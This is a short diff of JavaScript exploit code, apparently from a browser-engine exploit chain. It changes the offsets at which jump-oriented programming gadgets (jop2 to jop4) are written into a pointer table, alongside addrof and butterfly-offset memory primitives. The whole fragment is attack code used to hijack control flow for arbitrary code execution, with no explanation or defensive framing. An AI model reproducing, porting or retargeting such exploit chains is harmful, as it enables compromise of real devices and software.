@@ -252,9 +252,9 @@ export function init(Chain) {
     const rax_ptrs_p = get_view_vector(rax_ptrs);
     proto._rax_ptrs = rax_ptrs;
 
-    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
-    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
-    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
+    rax_ptrs.write64(0x80, get_gadget(gadgets, jop2));
+    rax_ptrs.write64(0x58, get_gadget(gadgets, jop3));
+    rax_ptrs.write64(0x10, get_gadget(gadgets, jop4));
     rax_ptrs.write64(0, get_gadget(gadgets, jop5));
 
     const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
